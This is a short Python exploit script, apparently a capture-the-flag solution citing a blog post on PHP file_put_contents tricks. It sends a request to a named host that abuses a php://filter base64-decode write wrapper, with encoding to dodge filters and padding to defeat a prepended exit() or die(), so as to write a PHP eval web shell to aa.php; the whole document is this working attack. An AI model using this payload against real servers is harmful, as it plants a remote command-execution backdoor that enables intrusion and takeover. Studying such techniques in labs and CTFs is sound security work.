# https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/
import pprint
from requests_html import HTMLSession

url = 'http://www.cduestc.cn:50007/'
params = {
    "file": 'php://filter/write=convert.base%364-decode/resource=aa.php'
}
data = {
    # <?php @eval($_POST['cmd']) ?> 写到aa.php
    # <?php exit(); 前面加1个a
    # <?php die(); 前面加2个aa
    'contents': 'aaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSkgPz4='
}
# proxies = {'http': 'http://localhost:8080'}
proxies = {}

s = HTMLSession()
res = s.post(url, params=params, data=data, proxies=proxies)
pprint.pprint(res.text)
